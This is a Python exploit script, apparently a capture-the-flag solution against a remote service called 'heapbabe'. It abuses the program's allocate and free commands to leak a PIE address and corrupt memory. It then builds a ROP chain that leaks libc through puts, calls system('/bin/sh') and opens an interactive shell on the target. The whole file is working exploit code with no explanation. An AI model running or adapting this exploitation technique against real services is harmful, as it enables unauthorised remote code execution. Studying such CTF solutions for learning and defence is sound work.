from yeonnic import *

context.arch="amd64"
elf=ELF("./heapbabe")
libc =ELF("./libc-2.23.so")

#p=process("./heapbabe", env={"LD_PRELOAD":"./libc-2.23.so"})
#p=process("./heapbabe")
p = remote("110.10.147.41", 8888)
gdb_pie_attach(p, [], "tracemalloc on\n")

def Allocate(data):
    p.sendline("A")
    print p.recv()
    p.sendline(str(0x1000))
    print p.recv()
    p.send(data+"\x00")
    print p.recv()

def Free(idx):
    p.sendline("F")
    print p.recv()
    p.sendline(str(idx))
    print p.recv()
    p.sendline("DELETE")
    print p.recv()

print p.recv()

Allocate("K"*0x100)
Allocate("A"*0x60)
Allocate("B"*0x60)

Free(2)
Free(1)

Allocate("A"*0x15+"BCD"+"\xaa")

p.sendline("F")
print p.recv()
p.sendline("2")
print p.recv()
p.sendline("DELETE")
print p.recvuntil("BCD")
pie_base = u64(p.recv(6).ljust(8, "\x00")) -0xcaa
elf.address = pie_base
print p.recv()

Free(1)
Free(0)

Allocate("A"*0x1000)
Allocate("A")

Free(0)

#ret = next(elf.search(asm("ret")))
ret = elf.address + 0x123c
pdr = next(elf.search(asm("pop rdi; ret")))

Allocate("B"*0x1b0)
Free(0)
#Allocate("B"*0x1c8+p64(elf.plt['puts']))
Allocate("B"*0x1c8+p64(ret))
Free(0)
time.sleep(0.5)

p.sendline("F")
time.sleep(0.5)
print p.recv()
time.sleep(1)
p.sendline("2")
time.sleep(1)
p.recvuntil(":")
print p.recv()
p.sendline("DELETE\x00\x00"+ flat(pdr, elf.got['puts'], elf.plt['puts'], elf.address+0xb90))

puts = u64(p.recv(6).ljust(8, "\x00"))
libc.address = puts - libc.symbols['puts']
time.sleep(0.5)
print p.recv()

p.sendline("F")
time.sleep(0.5)
print p.recv()
time.sleep(0.5)
p.sendline("2")
time.sleep(0.1)
print p.recv()
time.sleep(0.5)
time.sleep(0.1)
p.sendline("DELETE\x00\x00"+ flat(pdr, next(libc.search("/bin/sh\x00")), libc.symbols['system'], elf.address+0xb90))

print 'pie_base ->',hex(pie_base)
print 'libc_base ->',hex(libc.address)
p.interactive()
